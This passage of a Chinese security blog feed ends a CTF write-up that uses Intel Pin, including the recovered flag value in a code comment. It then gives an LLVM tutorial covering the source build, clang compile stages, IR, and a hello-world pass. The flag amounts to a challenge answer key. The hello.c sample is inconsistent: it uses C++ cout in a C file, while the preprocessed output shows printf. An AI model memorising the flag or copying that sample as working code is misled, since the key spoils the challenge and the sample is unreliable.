class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">if</span>(ok==<span class="hljs-number">0</span>):<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;result : &#x27;</span>+flag)<br>exit()<br><span class="hljs-comment">#flag&#123;2c7c093b-f648-11ed-a716-701ab8caaafe</span><br></code></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.intel.cn/content/www/cn/zh/developer/articles/tool/pin-a-dynamic-binary-instrumentation-tool.html">Intel官方文档 Pin</a></p><p><a href="https://blog.csdn.net/T2777/article/details/121282703#Pin%20%E6%80%BB%E7%BB%93%F0%9F%93%98">[csdn]Pin介绍，翻译了用户手册的一部分</a></p><p><a href="https://ctf-wiki.github.io/ctf-tools/binary-core-tools/instrumentation/intel_pin/">[ctf-wiki]intel pin</a></p><p><a href="https://www.v4ler1an.com/">V4ler1an的博客</a></p><p><a href="https://www.intel.cn/content/www/cn/zh/developer/articles/tool/software-development-emulator.html?_x_tr_sl=auto&_x_tr_tl=zh-CN&_x_tr_hl=zh-CN">Intel sde官方文档&amp;&amp;下载</a></p>]]></content>
    
    
    <categories>
      
      <category>软件测试&amp;漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pintools</tag>
      
      <tag>插桩</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LLVM学习记录</title>
    <link href="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <url>/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>放暑假前接触到了LLVM和软件分析，之前看AFL相关文章也了解到AFL有LLVM模式，后来发现还有LLVM PWN，因此学一学LLVM。本文主要是配环境，理解基本概念及校赛LLVM PWN出题记录。</p><span id="more"></span><h1 id="LLVM学习记录"><a href="#LLVM学习记录" class="headerlink" title="LLVM学习记录"></a>LLVM学习记录</h1><h2 id="LLVM介绍"><a href="#LLVM介绍" class="headerlink" title="LLVM介绍"></a>LLVM介绍</h2><p><a href="https://zh.wikipedia.org/wiki/LLVM">wiki-llvm</a></p><p>LLVM由c++写成，是一个自由软件项目，一种编译器基础设施，一种编译器架构，是一个模块化可重用的编译器及工具链技术的集合，用来开发编译器前端和后端。</p><p>LLVM官网首页中介绍了LLVM的主要官方子项目，包括LLVM Core libraries、clang、LLDB等。</p><p>传统静态编译器最流行的设计是三阶段设计，其主要组件是前端、优化器和后端。前端解析源代码，检查错误，并构建特定于语言的抽象语法树（AST）来表示输入代码。AST 可以选择转换为新的表示形式以进行优化，并且优化器和后端在代码上运行。传统的编译器诸如GCC前后端耦合在一起，很难支持一门新的语言。</p><p>LLVM框架与传统编译器的区别在于引入了**中间代码IR(SSA静态单赋值形式)**，这是LLVM中设计的最重要的一部分。前端对于不同语言的源代码转换成统一的IR的形式，IR选择性地经过一系列pass优化，后端将IR转换成不同的机器代码，这样的设计使得LLVM格外灵活，支持一种新的编程语言，只需要实现一个新的前端。支持一种新的硬件设备，只需要实现一个新的后端。而优化阶段针对的也是统一的LLVM IR。</p><p>**前端(Frontend)**：词法分析-&gt;语法分析(生成AST语法树)-&gt;语义分析-&gt;中间代码(IR)。</p><p><strong>优化器(Optimizer)</strong>: 中间代码优化，也可以加载LLVM Pass执行自定义的优化。</p><p><strong>后端(Backend)</strong>: 生成汇编，生成目标文件。把IR编译成目标平台的机器代码。</p><p>LLVM框架图</p><p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230709194735.png" alt="llvm框架"></p><p>LLVM前端已支持的编程语言：C、C++、ActionScript、Ada、D语言、Fortran、GLSL、Haskell、Java字节码、Objective-C、Swift、Python、Ruby、Crystal、Rust、Scala以及C#等</p><p>LLVM后端已支持指令集架构：x86、x86-64、ARM、MIPS、PowerPC以及RISC-V等</p><h2 id="llvm构建"><a href="#llvm构建" class="headerlink" title="llvm构建"></a>llvm构建</h2><p><a href="https://llvm.org/docs/GettingStarted.html#below">官方文档</a></p><p>安装llvm的方式有获取官方预构建二进制文件、使用软件包管理器、从源代码构建三种，为了更好地了解llvm结构，这里选择从源代码构建，仅包含了LLVM核心库及clang子项目</p><p>环境及llvm版本</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ubuntu2004</span>虚拟机<br><span class="hljs-attribute">cmake</span> version <span class="hljs-number">3</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">ninja</span> <span class="hljs-number">1</span>.<span class="hljs-number">10</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">lld</span><br><span class="hljs-attribute">llvm</span> <span class="hljs-number">17</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>git<br></code></pre></td></tr></table></figure><p>初始位置在Home目录，构建过程：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir LLVM<br>cd LLVM<br>git clone --depth 1 https://github.com/llvm/llvm-project.git<br>cd llvm-project<br>mkdir build<br>cd build <br>touch build.sh<br>sudo ./build.sh<br></code></pre></td></tr></table></figure><p>build.sh的内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">cmake -G Ninja \<br>-DLLVM_ENABLE_PROJECTS=&#x27;clang&#x27; \<br>-DCMAKE_BUILD_TYPE=Release \<br>-DLLVM_TARGETS_TO_BUILD=&quot;X86&quot; \<br>-DBUILD_SHARED_LIBS=On \<br>-DLLVM_USE_LINKER=lld \  <br>../llvm<br><br>ninja <br>ninja install<br></code></pre></td></tr></table></figure><p>测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang -v<br></code></pre></td></tr></table></figure><p> 参数解释：</p><ul><li>-G Ninja 生成ninja构建文件，使用ninja来构建</li><li>-DLLVM_ENABLE_PROJECTS&#x3D;’clang’ 除了 LLVM Core 外，还需要编译的子项目</li><li>-DCMAKE_BUILD_TYPE&#x3D;Release cmake的release编译模式，构建时不包含调试信息和断言，占用空间少，编译更快</li><li>-DLLVM_TARGETS_TO_BUILD&#x3D;“X86”：默认是ALL，选择X86可节约很多编译时间</li><li>-DBUILD_SHARED_LIBS&#x3D;On：指定动态链接 LLVM 的库，可以节省空间</li><li>-DLLVM_USE_LINKER&#x3D;lld，使用lld链接器，减少编译时间</li></ul><p><strong>踩到的坑</strong></p><p>1.cmake版本不能太低，如果通过apt下载的cmake版本无法达到要求，则自己到官网下载</p><p><a href="https://blog.csdn.net/m0_54348354/article/details/125697834">更新cmake参考</a></p><p>2.给虚拟机预留足够的磁盘空间，并且保存快照，内存设置至少4G。编译时间较长，内容较多，内存不足可能会导致虚拟机卡死，磁盘空间不足会导致编译终止，同时重启后无法正常进入图形化界面。</p><h2 id="llvm及clang基本使用"><a href="#llvm及clang基本使用" class="headerlink" title="llvm及clang基本使用"></a>llvm及clang基本使用</h2><p>Clang是类C语言的编译器前端，是LLVM的一个子项目,代码优化和后端由LLVM核心库提供，所以在下面的编译步骤拆解中，生成IR前都是使用clang命令，之后使用的都是llvm的其它工具</p><h3 id="llvm和clang的关系"><a href="#llvm和clang的关系" class="headerlink" title="llvm和clang的关系"></a>llvm和clang的关系</h3><p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230724030043.png" alt="QQ截图20230724030043"></p><h3 id="clang编译步骤及命令"><a href="#clang编译步骤及命令" class="headerlink" title="clang编译步骤及命令"></a>clang编译步骤及命令</h3><p>对于c++代码，使用clang++</p><p>对于c代码，使用clang</p><h4 id="1-查看编译的步骤"><a href="#1-查看编译的步骤" class="headerlink" title="1.查看编译的步骤"></a>1.查看编译的步骤</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang -ccc-print-phases hello.c<br></code></pre></td></tr></table></figure><p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230714183648.png" alt="QQ截图20230714183648"></p><p>这里冒号后的三个部分含义分别是工具、输入、输出</p><p>可以看到包括了input、preprocessor、compiler、backend、assembler、linker六个阶段,事实上在compiler阶段还包括了词法分析、语法分析、语义分析(输出抽象语法树AST)、IR代码生成及优化。</p><p>clang中每个步骤生成的文件</p><p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230724145504.png" alt="QQ截图20230724145504"></p><h4 id="2-编译步骤拆解"><a href="#2-编译步骤拆解" class="headerlink" title="2.编译步骤拆解"></a>2.编译步骤拆解</h4><p><strong>测试用例</strong>  hello.c</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Hello World!&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>预处理</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">clang -E hello.c</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">1 <span class="hljs-string">&quot;hello.c&quot;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">1 <span class="hljs-string">&quot;&lt;built-in&gt;&quot;</span> 1</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">1 <span class="hljs-string">&quot;&lt;built-in&gt;&quot;</span> 3</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">384 <span class="hljs-string">&quot;&lt;built-in&gt;&quot;</span> 3</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">1 <span class="hljs-string">&quot;&lt;command line&gt;&quot;</span> 1</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">1 <span class="hljs-string">&quot;&lt;built-in&gt;&quot;</span> 2</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">1 <span class="hljs-string">&quot;hello.c&quot;</span> 2</span><br>int main()&#123;<br> printf(&quot;Hello World!\n&quot;);<br> return 0;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>词法分析</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">clang -E -Xclang -dump-tokens hello.c</span><br>int &#x27;int&#x27; [StartOfLine]Loc=&lt;hello.c:1:1&gt;<br>identifier &#x27;main&#x27; [LeadingSpace]Loc=&lt;hello.c:1:5&gt;<br>l_paren &#x27;(&#x27;Loc=&lt;hello.c:1:9&gt;<br>r_paren &#x27;)&#x27;Loc=&lt;hello.c:1:10&gt;<br>l_brace &#x27;&#123;&#x27;Loc=&lt;hello.c:1:11&gt;<br>identifier &#x27;printf&#x27; [StartOfLine] [LeadingSpace]Loc=&lt;hello.c:2:2&gt;<br>l_paren &#x27;(&#x27;Loc=&lt;hello.c:2:8&gt;<br>string_literal &#x27;&quot;Hello World!\n&quot;&#x27;Loc=&lt;hello.c:2:9&gt;<br>r_paren &#x27;)&#x27;Loc=&lt;hello.c:2:25&gt;<br>semi &#x27;;&#x27;Loc=&lt;hello.c:2:26&gt;<br>return &#x27;return&#x27; [StartOfLine] [LeadingSpace]Loc=&lt;hello.c:3:2&gt;<br>numeric_constant &#x27;0&#x27; [LeadingSpace]Loc=&lt;hello.c:3:9&gt;<br>semi &#x27;;&#x27;Loc=&lt;hello.c:3:10&gt;<br>r_brace &#x27;&#125;&#x27; [StartOfLine]Loc=&lt;hello.c:4:1&gt;<br>eof &#x27;&#x27;Loc=&lt;hello.c:4:2&gt;<br></code></pre></td></tr></table></figure><p><strong>语法分析与语义分析生成语法树AST</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang -fsyntax-only -Xclang -ast-dump hello.c<br><span class="hljs-meta prompt_">#</span><span class="language-bash">代码量过大</span><br></code></pre></td></tr></table></figure><p><strong>生成LLVM IR</strong></p><p>LLVM IR在磁盘中有两种形式：文本格式,拓展名.ll;bitcode二进制格式，拓展名.bc</p><p>文本格式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang -S -emit-llvm hello.c<br></code></pre></td></tr></table></figure><p>二进制格式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang -c -emit-llvm hello.c<br></code></pre></td></tr></table></figure><p>llvm提供了两种格式相互转换的工具：<strong>汇编器llvm-as</strong>和反汇编器llvm-dis</p><p>llvm-as:将.ll转换成.bc</p><p>llvm-dis:将.bc转换成.ll</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">llvm-as hello.ll -o hello.bc<br>llvm-dis hello.bc -o hello.ll<br></code></pre></td></tr></table></figure><p><strong>使用lli工具执行LLVM bitcode格式程序(可选)</strong></p><p>注：LLI <em>不是</em>模拟器。它不会执行不同架构的 IR 并且它只能解释（或 JIT 编译）主机体系结构。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">lli hello.bc</span><br>Hello World!<br></code></pre></td></tr></table></figure><p><strong>使用llc工具生成汇编代码及目标文件</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">llc hello.bc -o hello.s<br></code></pre></td></tr></table></figure><p>生成的汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text<br>.file&quot;hello.c&quot;<br>.globlmain                            # -- Begin function main<br>.p2align4, 0x90<br>.typemain,@function<br>main:                                   # @main<br>.cfi_startproc<br># %bb.0:<br>pushq%rbp<br>.cfi_def_cfa_offset 16<br>.cfi_offset %rbp, -16<br>movq%rsp, %rbp<br>.cfi_def_cfa_register %rbp<br>subq$16, %rsp<br>movl$0, -4(%rbp)<br>movabsq$.L.str, %rdi<br>movb$0, %al<br>callqprintf@PLT<br>xorl%eax, %eax<br>addq$16, %rsp<br>popq%rbp<br>.cfi_def_cfa %rsp, 8<br>retq<br>.Lfunc_end0:<br>.sizemain, .Lfunc_end0-main<br>.cfi_endproc<br>                                        # -- End function<br>.type.L.str,@object                  # @.str<br>.section.rodata.str1.1,&quot;aMS&quot;,@progbits,1<br>.L.str:<br>.asciz&quot;Hello World!\n&quot;<br>.size.L.str, 14<br><br>.ident&quot;clang version 17.0.0 (https://github.com/llvm/llvm-project.git b16372c5fc65a6a7c14c19f01b17ac15a964d21f)&quot;<br>.section&quot;.note.GNU-stack&quot;,&quot;&quot;,@progbits<br></code></pre></td></tr></table></figure><p>生成目标文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">llc -filetype=obj hello.bc -o hello.o<br></code></pre></td></tr></table></figure><p>接下来进行链接即可生成可执行文件，链接器用ld和llvm的子项目lld都可以</p><h3 id="部分指令解释"><a href="#部分指令解释" class="headerlink" title="部分指令解释"></a>部分指令解释</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell">-ccc-print-phases<br>查看编译的步骤<br><br>-E, --preprocess<br>Only run the preprocessor<br>只允许预处理步骤<br>-S, --assemble<br>Only run preprocess and compilation steps<br>只运行预处理和编译步骤<br><br>-c, --compile<br>Only run preprocess, compile, and assemble steps<br>只运行预处理,编译和汇编步骤<br><br>-emit-llvm<br>使用汇编程序和目标文件的 LLVM 表示，可查看IR<br><br>-fsyntax-only<br>运行预处理器、解析器和语义分析阶段<br><br>-Xclang &lt;arg&gt;<br>传递 &lt;arg&gt; 到 clang -cc1<br><br>-dump-tokens<br>运行预处理器,拆分内部代码段为各种token、<br><br>-ast-dump<br>构建抽象语法树AST,然后对其进行拆解和调试<br></code></pre></td></tr></table></figure><p>更多细节查看</p><p><a href="https://clang.llvm.org/docs/ClangCommandLineReference.html">Clang 命令行参数参考</a></p><p><a href="https://llvm.org/docs/CommandGuide/index.html">llvm命令指南</a></p><h2 id="LLVM-IR"><a href="#LLVM-IR" class="headerlink" title="LLVM IR"></a>LLVM IR</h2><p><a href="https://llvm.org/docs/LangRef.html#abstract">llvm ir参考手册</a></p><p>LLVM的核心是<strong>IR语言</strong>（Intermediate Representation），一种类似汇编的底层语言。</p><p>IR是一种强类型的精简指令集（Reduced Instruction Set Computing，RISC），并对目标指令集进行了抽象。</p><p>LLVM IR有3种表示形式：</p><p>text：便于阅读的文本格式。扩展名为.ll<br>bitcode：二进制格式。扩展名为.bc<br>memory：内存格式</p><p>LLVM IR 的特点如下：</p><ul><li>采用静态单一赋值（Static Single Assignment，SSA），即每个值只有一个定义它的赋值操作</li><li>代码被组织为三地址指令（Three-address Instructions）</li><li>有无限多个寄存器</li></ul><h2 id="LLVM-Pass"><a href="#LLVM-Pass" class="headerlink" title="LLVM Pass"></a>LLVM Pass</h2><p>如下图，opt是LLVM的优化器和分析器，可以加载编译好的LLVM Pass，对LLVM IR进行优化。为了对IR进行自定义的优化，我们要做的就是编写好Pass的源代码，编写构建脚本对源码进行编译(一般是.so)，然后用opt工具来加载pass对IR进行优化。</p><p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230713210133.png" alt="QQ截图20230713210133"></p><p>首先，为了快速入门，先编写一个最基础的Pass，其功能是打印出程序中非外部函数的函数名。</p><p>需要注意的是，在<a href="https://releases.llvm.org/14.0.0/docs/ReleaseNotes.html">LLVM 14.0.0 发行说明</a>中，提到了已经不再推荐使用旧版的pass管理器(the legacy pass manager)，并且旧版在llvm14.0.0之后的版本将被移除，但是网上的大部分pass编写教程都还是基于旧版。本文使用的是LLVM17.0.0 git，编译<a href="https://github.com/sampsyo/llvm-pass-skeleton/tree/master">旧版框架pass</a>时发现缺少include&#x2F;llvm&#x2F;Transforms&#x2F;IPO&#x2F;PassManagerBuilder.h这个头文件，源代码中也没有lib&#x2F;Transform&#x2F;IPO&#x2F;PassManagerBuilder.cpp源文件，而PassManagerBuilder类用于构建旧版PassManager以及默认的Pass管道，这说明确实已经不支持旧版PM了。所以这里使用新版pass管理器。</p><p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230728151311.png" alt="QQ截图20230728151311"></p><p><a href="https://llvm.org/docs/WritingAnLLVMPass.html">旧版PM官方教程</a></p><p><a href="https://llvm.org/docs/WritingAnLLVMNewPMPass.html">新版PM官方教程</a></p><p>PM是PassManager的简称</p><h3 id="源码集成编译"><a href="#源码集成编译" class="headerlink" title="源码集成编译"></a>源码集成编译</h3><h4 id="不生成和使用-so的pass编写方式"><a href="#不生成和使用-so的pass编写方式" class="headerlink" title="不生成和使用.so的pass编写方式"></a>不生成和使用.so的pass编写方式</h4><p>该方式不会产生pass的.so文件，使用opt时直接添加–passes来使用pass，opt –passes具体的用法在<a href="https://llvm.org/docs/NewPassManager.html#id2">该文档</a></p><p><a href="https://llvm.org/docs/WritingAnLLVMNewPMPass.html">新版Writing an LLVM Pass官方教程</a>中是源码内编译的，跟着教程做就可以了</p><p>在llvm&#x2F;lib&#x2F;Transforms&#x2F;Utils&#x2F;HelloWorld.cpp<code>llvm/lib/Transforms/Utils/CMakeLists.txt</code>中添加HelloWorld.cpp,即Pass的源文件</p><p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230731172147.png" alt="QQ截图20230731172147"></p><p>添加llvm&#x2F;include&#x2F;llvm&#x2F;Transforms&#x2F;Utils&#x2F;HelloWorld.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> LLVM_TRANSFORMS_HELLONEW_HELLOWORLD_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LLVM_TRANSFORMS_HELLONEW_HELLOWORLD_H</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/PassManager.h&quot;</span></span><br><br>namespace llvm &#123;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloWorldPass</span> :</span> public PassInfoMixin&lt;HelloWorldPass&gt; &#123;<br>public:<br>  PreservedAnalyses <span class="hljs-title function_">run</span><span class="hljs-params">(Function &amp;F, FunctionAnalysisManager &amp;AM)</span>;<br>&#125;;<br><br>&#125; <span class="hljs-comment">// namespace llvm</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// LLVM_TRANSFORMS_HELLONEW_HELLOWORLD_H</span></span><br></code></pre></td></tr></table></figure><p>添加llvm&#x2F;lib&#x2F;Transforms&#x2F;Utils&#x2F;HelloWorld.cpp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//===-- HelloWorld.cpp - Example Transformations --------------------------===//</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Part of the LLVM Project, under the Apache License v2.0 with LLVM Exceptions.</span><br><span class="hljs-comment">// See https://llvm.org/LICENSE.txt for license information.</span><br><span class="hljs-comment">// SPDX-License-Identifier: Apache-2.0 WITH LLVM-exception</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//===----------------------------------------------------------------------===//</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Transforms/Utils/HelloWorld.h&quot;</span></span><br><br>using namespace llvm;<br><br>PreservedAnalyses <span class="hljs-title function_">HelloWorldPass::run</span><span class="hljs-params">(Function &amp;F,</span><br><span class="hljs-params">                                      FunctionAnalysisManager &amp;AM)</span> &#123;<br>  errs() &lt;&lt; F.getName() &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>  <span class="hljs-keyword">return</span> PreservedAnalyses::all();<br>&#125;<br></code></pre></td></tr></table></figure><p>在llvm&#x2F;lib&#x2F;Passes&#x2F;PassRegistry.def中添加，该步骤是注册pass，第一个参数即在opt工具中的pass名称</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">FUNCTION_PASS</span><span class="hljs-params">(<span class="hljs-string">&quot;helloworld&quot;</span>, HelloWorldPass()</span></span>)<br></code></pre></td></tr></table></figure><p><img src="/2023/10/03/LLVM%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/QQ%E6%88%AA%E5%9B%BE20230731172806.png" alt="QQ截图20230731172806"></p><p>运行上文llvm构建一节中的build.sh,重新构建llvm。之前已经构建好的不会重新编译，所以编译得很快</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">cmake -G Ninja \<br>-DLLVM_ENABLE_PROJECTS=&#x27;clang&#x27; \<br>-DCMAKE_BUILD_TYPE=Release \<br>-DLLVM_TARGETS_TO_BUILD=&quot;X86&quot; \<br>-DBUILD_SHARED_LIBS=On \<br>-DLLVM_USE_LINKER=lld \  <br>../llvm<br><br>ninja <br>ninja install<br></code></pre></td></tr></table></figure><p>随后使用opt时加入参数-passes&#x3D;helloworld就能使用该名为helloworld的pass了</p><p>测试用例</p><p>helloworld.ll</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">define</span> <span class="hljs-type">i32</span> <span class="hljs-title">@foo</span>() &#123;<br>  <span class="hljs-variable">%a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">add</span> <span class="hljs-type">i32</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span> <span class="hljs-number">3</span><br>  <span class="hljs-keyword">ret</span> <span class="hljs-type">i32</span> <span class="hljs-variable">%a</span><br>&#125;<br><br><span class="hljs-keyword">define</span> void <span class="hljs-title">@bar</span>() &#123;<br>  <span class="hljs-keyword">ret</span> void<br>&#125;<br></code></pre></td></tr></table></figure><p>测试结果，测试时位于构建时创建的build目录中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">opt -disable-output <span class="hljs-string">&#x27;/home/op1n/LLVM/llvm_pass/ir_for_test/helloworld.ll&#x27;</span>   -passes=helloworld</span> <br>foo<br>bar<br><span class="hljs-meta prompt_">#</span><span class="language-bash">--print-passes可打印出所有注册的pass</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">opt --print-passes | grep hello</span> <br>  helloworld<br></code></pre></td></tr></table></figure><h4 